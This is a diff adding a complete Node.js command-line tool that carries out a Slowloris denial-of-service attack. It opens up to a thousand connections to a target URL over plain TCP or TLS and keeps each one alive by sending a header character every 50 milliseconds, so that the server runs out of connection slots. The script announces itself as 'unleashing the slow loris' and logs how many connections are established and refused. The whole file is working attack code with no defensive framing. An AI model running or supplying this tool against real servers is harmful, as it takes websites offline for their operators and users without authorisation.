@@ -1,0 +1,82 @@
+#!/usr/bin/env node
+
+/**
+ * Module dependencies.
+ */
+
+var program = require('commander');
+var pkg = require('./package.json');
+var parse = require('url').parse;
+var net = require('net');
+var tls = require('tls');
+
+// options
+
+program
+  .version(pkg.version)
+  .usage('[options] <url>')
+  .option('-c, --connections <n>', 'number of connections to open [1000]', parseInt)
+  .parse(process.argv);
+
+// <url>
+
+var url = process.argv[2];
+if (!url) throw new Error('url required');
+url = parse(url);
+var c = program.connections || 1000;
+
+console.log();
+console.log('  unleashing the slow loris on %s', url.href);
+console.log('  connections: %s', c);
+
+var req = [
+  'Host: ' + url.host + '\r\n',
+  'Accept: */*\r\n'
+].join('');
+
+var n = 1000;
+while (n--) {
+  req += 'X-Loris-' + n + ': ' + n + '\r\n';
+}
+
+//The end of GET request
+req += '\r\n';
+
+var start = new Date().getTime();
+
+while (c--) send();
+var established = 0;
+var refused = 0;
+
+function send() {
+  var secure = 'https:' == url.protocol;
+
+  var opts = {};
+  opts.port = url.port || (secure ? 443 : 80);
+  opts.host = url.hostname;
+
+  var mod = secure ? tls : net;
+
+  var sock = mod.connect(opts, function(){
+    ++established;
+    console.log('Established: ' + established + '. Refused: ' + refused);
+
+    var i = 0;
+    sock.write('GET / HTTP/1.1\r\n');
+
+    setInterval(function(){
+      if (null == req[i]) return;
+      sock.write(req[i++]);
+    }, 50);
+  });
+
+  sock.setTimeout(0);
+
+  sock.on('error', function(){
+    ++refused;
+    console.log('Aborted (ms from start ' + (new Date().getTime() - start) + '). Established: ' + established + '. Refused: ' + refused);
+    if (refused === established) {
+      process.exit();
+    }
+  });
+}
